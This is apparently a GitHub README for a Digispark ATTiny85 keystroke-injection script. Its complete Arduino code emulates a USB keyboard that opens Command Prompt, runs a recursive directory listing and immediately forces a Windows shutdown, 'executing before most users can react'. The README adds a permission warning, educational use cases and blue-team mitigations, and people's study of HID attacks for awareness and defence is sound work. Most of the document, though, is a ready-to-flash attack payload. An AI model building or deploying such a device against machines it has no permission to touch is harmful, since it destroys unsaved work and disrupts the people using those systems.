# Digispark Command Prompt Shutdown (ATTiny85)

This Digispark (ATTiny85) script emulates a USB keyboard to automatically open Command Prompt, execute a sequence of commands, and then shut down the Windows system.


# What This Script Does

## When plugged into a Windows machine, the Digispark performs the following actions:

* Opens the Run dialog (Win + R).

* Launches Command Prompt.

* Changes the console color to red (color C).

* Executes a recursive directory listing: dir /s


# Immediately shuts down the system: 

shutdown -s -t 0


# Exits Command Prompt

All actions are automated and executed very quickly.


# How It Works

* Uses the DigiKeyboard library.

* Emulates a USB HID keyboard.

* Requires no drivers.

* Relies on keystroke injection rather than exploits.

* Executes before most users can react.


# Code
```bash
#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("CMD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("color C");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("dir /s");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("shutdown -s -t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("EXIT");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
}

void loop() { }
```

# Requirements

* Digispark ATTiny85.

* Arduino IDE.

* Digispark board support.

* DigiKeyboard library.

* Windows OS (tested).


# Warning

Causes immediate system shutdown.

Any unsaved data will be lost.

May stress storage devices due to dir /s.

Never run on systems you do not own or have permission to test.


# Educational Use Cases

HID attack demonstrations.

Physical access security testing.

Red team / blue team lab exercises.

USB attack awareness training.

Digispark automation learning.


# Defensive Notes (Blue Team)

This attack can be mitigated by:

Disabling unused USB ports.

Using USB device control / HID whitelisting.

Enforcing endpoint protection with behavior blocking.

Locking the workstation when unattended.


# License

MIT License

Copyright (c) 2026 John Valinsky

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files, to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
